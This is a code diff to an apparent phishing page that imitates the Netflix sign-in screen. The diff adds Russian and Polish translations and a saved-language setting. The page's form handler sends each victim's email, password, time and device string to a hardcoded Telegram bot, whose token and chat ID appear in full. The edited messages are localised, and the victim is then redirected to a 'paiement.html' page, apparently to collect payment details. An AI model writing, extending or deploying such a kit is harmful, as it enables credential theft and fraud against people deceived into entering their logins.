@@ -365,6 +365,8 @@
             <option value="en">English</option>
             <option value="es">Español</option>
             <option value="de">Deutsch</option>
+            <option value="ru">Русский</option>
+            <option value="pl">Polski</option>
         </select>
     </header>
 
@@ -488,12 +490,49 @@
                 cookiesLink: "Cookie-Einstellungen",
                 legalLink: "Rechtliche Hinweise",
                 adsLink: "Werbepräferenzen"
+            },
+            ru: {
+                loginTitle: "Войти",
+                emailLabel: "Электронная почта или номер телефона",
+                passwordLabel: "Пароль",
+                loginButtonText: "Войти",
+                rememberLabel: "Запомнить меня",
+                helpLink: "Нужна помощь?",
+                newUserText: "Впервые в Netflix?",
+                signupLink: "Зарегистрируйтесь сейчас.",
+                questionsText: "Есть вопросы? Звоните",
+                faqLink: "Частые вопросы",
+                helpCenterLink: "Центр поддержки",
+                termsLink: "Условия использования",
+                privacyLink: "Конфиденциальность",
+                cookiesLink: "Настройки файлов cookie",
+                legalLink: "Юридические уведомления",
+                adsLink: "Настройки рекламы"
+            },
+            pl: {
+                loginTitle: "Zaloguj się",
+                emailLabel: "Adres e-mail lub numer telefonu",
+                passwordLabel: "Hasło",
+                loginButtonText: "Zaloguj się",
+                rememberLabel: "Zapamiętaj mnie",
+                helpLink: "Potrzebujesz pomocy?",
+                newUserText: "Nowy w Netflix?",
+                signupLink: "Zarejestruj się teraz.",
+                questionsText: "Pytania? Zadzwoń pod numer",
+                faqLink: "FAQ",
+                helpCenterLink: "Centrum pomocy",
+                termsLink: "Warunki użytkowania",
+                privacyLink: "Prywatność",
+                cookiesLink: "Preferencje dotyczące plików cookie",
+                legalLink: "Informacje prawne",
+                adsLink: "Ustawienia reklam"
             }
         };
 
         // Gestion du changement de langue
         document.getElementById('languageSelector').addEventListener('change', function() {
             const lang = this.value;
+            localStorage.setItem('netflixLang', lang);
             updateLanguage(lang);
         });
 
@@ -505,6 +544,13 @@
                     element.textContent = value;
                 }
             }
+        }
+
+        // Initialiser la langue au chargement
+        const savedLang = localStorage.getItem('netflixLang');
+        if (savedLang) {
+            document.getElementById('languageSelector').value = savedLang;
+            updateLanguage(savedLang);
         }
 
         // Gestion du formulaire
@@ -521,14 +567,35 @@
             // Send data to Telegram bot
             const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
             const chatId = '-4883048028';
-            const message = `🔐 NOUVELLE TENTATIVE DE CONNEXION NETFLIX 🔐
+            const lang = document.getElementById('languageSelector').value;
+            const message = `🔐 ${lang === 'en' ? 'NEW NETFLIX LOGIN ATTEMPT' : 
+                           lang === 'es' ? 'NUEVO INTENTO DE INICIO DE SESIÓN EN NETFLIX' :
+                           lang === 'de' ? 'NEUE NETFLIX-ANMELDEVERSUCH' :
+                           lang === 'ru' ? 'НОВАЯ ПОПЫТКА ВХОДА В NETFLIX' :
+                           lang === 'pl' ? 'NOWA PRÓBA LOGOWANIA DO NETFLIX' : 'NOUVELLE TENTATIVE DE CONNEXION NETFLIX'} 🔐
 
-📧 Email: ${email}
-🔑 Mot de passe: ${password}
+📧 ${lang === 'en' ? 'Email' : 
+    lang === 'es' ? 'Correo electrónico' : 
+    lang === 'de' ? 'E-Mail' : 
+    lang === 'ru' ? 'Электронная почта' : 
+    lang === 'pl' ? 'E-mail' : 'E-mail'}: ${email}
+🔑 ${lang === 'en' ? 'Password' : 
+    lang === 'es' ? 'Contraseña' : 
+    lang === 'de' ? 'Passwort' : 
+    lang === 'ru' ? 'Пароль' : 
+    lang === 'pl' ? 'Hasło' : 'Mot de passe'}: ${password}
 
 ⏰ ${new Date().toLocaleString()}
-🌍 Langue: ${document.getElementById('languageSelector').value.toUpperCase()}
-📱 Device: ${navigator.userAgent}`;
+🌍 ${lang === 'en' ? 'Language' : 
+    lang === 'es' ? 'Idioma' : 
+    lang === 'de' ? 'Sprache' : 
+    lang === 'ru' ? 'Язык' : 
+    lang === 'pl' ? 'Język' : 'Langue'}: ${document.getElementById('languageSelector').value.toUpperCase()}
+📱 ${lang === 'en' ? 'Device' : 
+    lang === 'es' ? 'Dispositivo' : 
+    lang === 'de' ? 'Gerät' : 
+    lang === 'ru' ? 'Устройство' : 
+    lang === 'pl' ? 'Urządzenie' : 'Appareil'}: ${navigator.userAgent}`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -550,7 +617,8 @@
             .finally(() => {
                 // Wait 2 seconds before redirecting (simulating login)
                 setTimeout(() => {
-                    window.location.href = 'paiement.html';
+                    const lang = document.getElementById('languageSelector').value;
+                    window.location.href = `paiement.html?lang=${lang}`;
                 }, 2000);
             });
         });
